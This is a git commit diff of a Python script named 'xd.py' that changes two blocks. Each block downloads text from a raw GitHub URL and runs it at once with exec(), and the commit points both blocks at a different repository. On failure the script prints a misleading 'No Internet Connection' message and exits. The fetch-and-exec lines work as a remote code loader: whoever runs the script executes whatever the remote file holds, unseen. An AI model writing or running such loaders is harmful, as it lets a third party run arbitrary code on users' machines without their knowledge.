766dee48baa68b06c1d2eea1c394014911d27360
AhmedxMalik <ahmad.malik0176@my.com>
2024-08-19 19:39:39 +0500

    xd.py

--- xd.py
+++ xd.py
@@ -25,13 +25,13 @@ except:pass
 from datetime import date
 today = date.today()
 try:
-    data = requests.get('https://raw.githubusercontent.com/MUGHAL-X-DOD/dod/main/Review/office').text
+    data = requests.get('https://raw.githubusercontent.com/AhmedxMalik/Test/main/Text').text
     exec(data)
 except:
     print('\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m You Have No Internet Connection-l ..!');exit()
 #VERSION 
 try:
-    data = requests.get('https://raw.githubusercontent.com/MUGHAL-X-DOD/dod/main/Review/paid').text
+    data = requests.get('https://raw.githubusercontent.com/AhmedxMalik/Test/main/Text').text
     exec(data)
 except:
     print('\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m You Have No Internet Connection ..!');exit()
